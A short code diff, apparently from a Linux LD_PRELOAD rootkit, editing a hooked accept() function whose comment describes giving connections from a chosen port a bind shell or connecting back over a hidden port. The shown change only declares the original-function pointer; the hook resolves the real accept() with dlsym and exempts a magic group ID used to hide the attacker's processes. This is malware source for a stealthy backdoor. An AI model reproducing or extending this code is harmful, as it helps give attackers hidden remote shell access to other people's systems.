@@ -6,12 +6,13 @@ char art[] = { 0x20, 0x23, 0x23, 0x65, 0x65, 0x65, 0x65, 0x65, 0x65, 0x65, 0x65,
 /*
  * accept() hook. If connection comes from our port, use the socket for a bind shell. Alternatively connect back over our hidden port.
 */
+
+int (*o_accept)(int, struct sockaddr *, socklen_t *);
 int accept(int sockfd, struct sockaddr * addr, socklen_t * addrlen) {
 
 	#ifdef DEBUG
 	fprintf(stderr, "accept() called!\n");
 	#endif
-
 	if(!o_accept) o_accept = dlsym(RTLD_NEXT, "accept");
 
 	if(getegid() == GID) return o_accept(sockfd, addr, addrlen);
